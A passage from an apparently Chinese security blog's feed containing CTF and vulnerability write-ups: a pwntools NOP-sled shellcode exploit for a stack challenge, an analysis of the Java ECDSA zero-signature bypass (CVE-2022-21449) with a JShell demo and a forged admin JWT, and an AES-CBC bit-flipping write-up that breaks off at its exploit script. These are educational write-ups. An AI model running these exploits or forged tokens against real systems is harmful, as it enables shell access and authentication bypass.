query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> sub_8048A22(v5, (<span class="type">int</span>)&amp;savedregs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>query_position函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序执行逻辑是：</p><ul><li>输出栈中的地址</li><li>输入字符串赋给seed</li><li>输入地址赋给v5</li><li>使用v5()，从输入的地址，执行该地址的代码</li></ul><p>如果在栈中的某个位置填入大量nop指令再接上shellcode，随后控制程序的执行流从nop指令开始执行，则程序就会一直执行之前填入的nop，然后就是shellcode，从而成功pwn掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;xxxx&quot;</span>,<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;current location: &quot;</span>)</span><br><span class="line"><span class="comment"># 接收position</span></span><br><span class="line">addr = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"><span class="comment"># \x90为nop指令</span></span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span> * <span class="number">1336</span> + asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># 输进v5的地址</span></span><br><span class="line">shell_addr = addr + <span class="number">0x2d</span> + <span class="number">668</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(shell_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052351754.png" alt="image-20240105235100666"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;&lt;img src=&quot;https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008&quot; alt=&quot;img&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-21449-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/</id>
    <published>2023-12-27T07:36:51.000Z</published>
    <updated>2023-12-27T07:39:44.514Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ECDSA代表椭圆曲线数字签名算法，与旧的RSA签名相比，ECDSA签名长度更短，因此应用面较广，例如各种JWT场景。服务器使用java15~18版本的ECDSA，会受到攻击者绕过的影响。由于ECDSA未对提交的r和s值做仔细的检查，攻击者可通过将为0的r和s作为参数提交给服务器，实现绕过验签的过程。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>JShell – 版本 15.0.2</p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jshell&gt; <span class="keyword">import</span> java.security.*</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">keys</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>).generateKeyPair()</span><br><span class="line">keys ==&gt; java.security.KeyPair@63e31ee</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">blankSignature</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">64</span>]</span><br><span class="line">blankSignature ==&gt; <span class="type">byte</span>[<span class="number">64</span>] &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, ... , <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">sig</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256WithECDSAInP1363Format&quot;</span>)</span><br><span class="line">sig ==&gt; Signature object: SHA256WithECDSAInP1363Format&lt;not initialized&gt;</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.initVerify(keys.getPublic())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.update(<span class="string">&quot;Hello, World&quot;</span>.getBytes())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.verify(blankSignature)</span><br><span class="line">$<span class="number">7</span> ==&gt; <span class="literal">true</span></span><br><span class="line"><span class="comment">// 成功绕过验签</span></span><br></pre></td></tr></table></figure><h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><p>ECDSA签名由两个值组成，称为r和s。验签需要检查的含有r, s, 公钥和消息的摘要值的方程。方程一侧是r, 另一侧包含r和s。因此如果r和s均为0，则方程结果是$0&#x3D;0\times \alpha(something)$, 从而方程成立，验签通过。</p><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>jwt一般会对参数编码，故针对特定场景，需要构造不同的payload。</p><p>强网杯2022 <strong>myJWT</strong> :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDSA</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> KeyPair <span class="title function_">keyGen</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">384</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="keyword">return</span> keyPair;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] sign(<span class="type">byte</span>[] str, ECPrivateKey privateKey) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initSign(privateKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="type">byte</span>[] sig = signature.sign();</span><br><span class="line">        <span class="keyword">return</span> sig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(<span class="type">byte</span>[] sig, <span class="type">byte</span>[] str ,ECPublicKey publicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initVerify(publicKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="keyword">return</span> signature.verify(sig);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jwt</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">EXPIRE</span> <span class="operator">=</span> <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">ECDSA</span> <span class="variable">ecdsa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ECDSA</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateToken</span><span class="params">(String user, ECPrivateKey ecPrivateKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">header</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        header.put(<span class="string">&quot;alg&quot;</span>, <span class="string">&quot;myES&quot;</span>);</span><br><span class="line">        header.put(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(header.toJSONString().getBytes());</span><br><span class="line">        payload.put(<span class="string">&quot;iss&quot;</span>, <span class="string">&quot;qwb&quot;</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;exp&quot;</span>, System.currentTimeMillis() + EXPIRE * <span class="number">1000</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;name&quot;</span>, user);</span><br><span class="line">        payload.put(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(payload.toJSONString().getBytes());</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">        <span class="type">byte</span>[] sig = ecdsa.sign(content.getBytes(), ecPrivateKey);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(sig);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, content, sigB64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String token, ECPublicKey ecPublicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] parts = token.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (parts.length != <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> parts[<span class="number">0</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> parts[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> parts[<span class="number">2</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">            <span class="type">byte</span>[] sig = Base64.getUrlDecoder().decode(sigB64);</span><br><span class="line">            <span class="keyword">return</span> ecdsa.verify(sig, content.getBytes(), ecPublicKey);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkAdmin</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">if</span>(verify(token, ecPublicKey)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> token.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadDecodeString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getUrlDecoder().decode(payloadB64));</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> JSON.parseObject(payloadDecodeString);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!payload.getString(<span class="string">&quot;name&quot;</span>).equals(user)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (payload.getLong(<span class="string">&quot;exp&quot;</span>) &lt; System.currentTimeMillis()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> payload.getBoolean(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getFlag</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">err</span> <span class="operator">=</span> <span class="string">&quot;You are not the administrator.&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(checkAdmin(token, ecPublicKey, user)) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/root/task/flag.txt&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(file));</span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">            br.close();</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">task</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">        System.out.print(String.format(<span class="string">&quot;hello %s, let&#x27;s start your challenge.\n&quot;</span>, user));</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> ecdsa.keyGen();</span><br><span class="line">        <span class="type">ECPrivateKey</span> <span class="variable">ecPrivateKey</span> <span class="operator">=</span> (ECPrivateKey) keyPair.getPrivate();</span><br><span class="line">        <span class="type">ECPublicKey</span> <span class="variable">ecPublicKey</span> <span class="operator">=</span> (ECPublicKey) keyPair.getPublic();</span><br><span class="line">        <span class="type">String</span> <span class="variable">menu</span> <span class="operator">=</span> <span class="string">&quot;1.generate token\n2.getflag\n&gt;&quot;</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">choice</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (count &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            System.out.print(menu);</span><br><span class="line">            choice = Integer.parseInt(input.nextLine().strip());</span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> generateToken(user, ecPrivateKey);</span><br><span class="line">                System.out.println(token);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;your token:&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">                <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> getFlag(token, ecPublicKey, user);</span><br><span class="line">                System.out.println(flag);</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        task();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiV2Fua2tvIFJlZSIsImFkbWluIjp0cnVlLCJleHAiOjE3NTkzMjEzMjg0Mzh9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;ECDSA代表椭圆曲线数字签名算法，与旧的RS</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>GoGoCrypto_writeup</title>
    <link href="http://example.com/2023/12/27/GoGoCrypto-writeup/"/>
    <id>http://example.com/2023/12/27/GoGoCrypto-writeup/</id>
    <published>2023-12-26T16:10:28.000Z</published>
    <updated>2023-12-27T07:39:37.663Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>本人参与极客大挑战2023的出题工作，主要负责密码学板块。</p><p>对于GoGoCrypto这道反响比较高的题目，这里附上题解。</p><p><a href="https://github.com/AL3XEI709/Geek23/blob/main/GoGoCrypto/GoGoCrypto_setup.zip">题目源码</a></p><p>这题用Golang写了一个Flag Folder的交互，流程大概长这样：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270044077.png" alt="image-20231227004357980"></p><p>加解密采用的算法是AES的CBC mod。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270045335.png" alt="image-20231227004502286"></p><p>这种加密算法的主要攻击手段是<strong>字节翻转（bit flipping）</strong>，这种攻击的前提是一个明文分组是已知的。</p><p>sid是16字节，根据填充算法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := aes.BlockSize - (<span class="built_in">len</span>(pt) % aes.BlockSize)</span><br><span class="line">padding := bytes.Repeat([]<span class="type">byte</span>&#123;<span class="type">byte</span>(padlen)&#125;, padlen)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">append</span>(pt, padding...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以知道填充后有两块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">block#1 block#2</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">| sid | Padding (&quot;\x10&quot;*16) |</span><br><span class="line">+-----------------+-----------------+</span><br></pre></td></tr></table></figure><p>那么我们就能修改第一个密文分组，来控制解密后的第</p><p>二个明文分组。具体的原理是：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270047773.png" alt="image-20231227004700688"></p><p>这一步显然会破坏第一块的明文，但并不影响我们的利用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unpad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := <span class="type">int</span>(pt[<span class="built_in">len</span>(pt)<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">return</span> pt[:<span class="built_in">len</span>(pt)-padlen]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unpad函数只是将padding的最后一个字节作为padding长度，根本不检查，所以我们可以很容易的让padding长度为len(plaintext) - 1，那么我们就可以得到一个只有一个字节的明文了！</p><p>因此攻击流程是：</p><ul><li><p>修改密文并上传</p></li><li><p>服务端解密，得到只有一个字节的明文</p></li><li><p>遍历所有明文（254），必然得到flag。</p></li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> dec, b64encode <span class="keyword">as</span> enc </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor 